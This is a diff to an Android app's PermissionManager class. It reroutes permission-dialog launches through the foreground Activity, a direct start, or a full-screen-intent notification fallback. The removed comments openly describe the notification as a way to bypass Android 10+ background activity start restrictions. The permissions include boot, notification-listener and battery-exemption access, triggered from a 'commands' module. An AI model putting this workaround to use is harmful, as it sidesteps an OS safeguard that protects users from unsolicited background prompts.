@@ -1,6 +1,7 @@
 package com.task.tusker.commands;
 
 import android.Manifest;
+import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -15,6 +16,7 @@ import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import com.task.tusker.PermissionRequestActivity;
+import com.task.tusker.utils.ActivityTracker;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -64,7 +66,6 @@ public class PermissionManager {
         put(Manifest.permission.RECEIVE_BOOT_COMPLETED,         "Receive Boot Completed");
         put(Manifest.permission.INTERNET,                       "Internet");
         put(Manifest.permission.ACCESS_NETWORK_STATE,           "Access Network State");
-        put("android.permission.POST_NOTIFICATIONS",            "Post Notifications (Android 13+)");
         put("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE", "Notification Listener");
         put("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "Ignore Battery Optimizations");
     }};
@@ -90,19 +91,35 @@ public class PermissionManager {
     }
 
     /**
-     * On Android 10+ (API 29+) apps cannot start activities from the background —
-     * the call is silently dropped with no exception.  The workaround is to fire a
-     * full-screen-intent notification: Android treats it as a high-priority call-
-     * style alert and immediately launches the activity even from the background.
+     * Launch an Activity that will show a permission dialog.
      *
-     * On older APIs a direct startActivity() still works fine.
+     * Strategy (in priority order):
+     *  1. If an Activity is currently in the foreground, start via that Activity —
+     *     foreground-to-foreground starts are always allowed on every Android version,
+     *     so the permission dialog appears immediately with no detour.
+     *  2. Android 9 and below — direct context.startActivity() works from background.
+     *  3. Android 10+ background — fire a full-screen-intent notification as a last
+     *     resort (requires POST_NOTIFICATIONS on API 33+; may be silent if denied).
      */
-    private void launchViaNotification(Intent activityIntent) {
+    private void launchPermissionIntent(Intent activityIntent) {
+        // Path 1 — foreground Activity: direct launch, always works, no notification.
+        Activity fg = ActivityTracker.getForeground();
+        if (fg != null) {
+            try {
+                fg.startActivity(activityIntent);
+                return;
+            } catch (Exception e) {
+                Log.w(TAG, "launchPermissionIntent: foreground startActivity failed, falling back: " + e.getMessage());
+            }
+        }
+
+        // Path 2 — Android 9 and below: background direct launch works.
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-            // Android 9 and below: direct launch works from background.
-            context.startActivity(activityIntent);
+            try { context.startActivity(activityIntent); } catch (Exception ignored) {}
             return;
         }
+
+        // Path 3 — Android 10+ background: notification trampoline.
         try {
             PendingIntent pi = PendingIntent.getActivity(
                     context, PERM_NOTIF_ID, activityIntent,
@@ -133,7 +150,7 @@ public class PermissionManager {
 
             nm.notify(PERM_NOTIF_ID, notif);
         } catch (Exception e) {
-            Log.w(TAG, "launchViaNotification failed, falling back to direct start: " + e.getMessage());
+            Log.w(TAG, "launchPermissionIntent: notification fallback failed: " + e.getMessage());
             try { context.startActivity(activityIntent); } catch (Exception ignored) {}
         }
     }
@@ -215,12 +232,17 @@ public class PermissionManager {
             if (intent != null) {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 if (SETTINGS_ONLY_PERMISSIONS.contains(permission)) {
-                    // Settings intents launch system UI — exempt from background restrictions.
-                    context.startActivity(intent);
+                    // Settings intents launch system UI — always safe to start directly.
+                    Activity fg = ActivityTracker.getForeground();
+                    if (fg != null) {
+                        try { fg.startActivity(intent); }
+                        catch (Exception e) { context.startActivity(intent); }
+                    } else {
+                        context.startActivity(intent);
+                    }
                 } else {
-                    // Our PermissionRequestActivity — must use notification on API 29+
-                    // to bypass Android 10+ background activity start restriction.
-                    launchViaNotification(intent);
+                    // Standard runtime permission — use PermissionRequestActivity trampoline.
+                    launchPermissionIntent(intent);
                 }
                 result.put("success", true);
                 result.put("message", "Permission dialog shown for: " + permission);
@@ -256,7 +278,7 @@ public class PermissionManager {
                 intent.putExtra(PermissionRequestActivity.EXTRA_PERMISSIONS,
                         missing.toArray(new String[0]));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                launchViaNotification(intent);
+                launchPermissionIntent(intent);
                 result.put("success", true);
                 result.put("message", "Showing permission dialog for " + missing.size()
                         + " missing permission(s)");
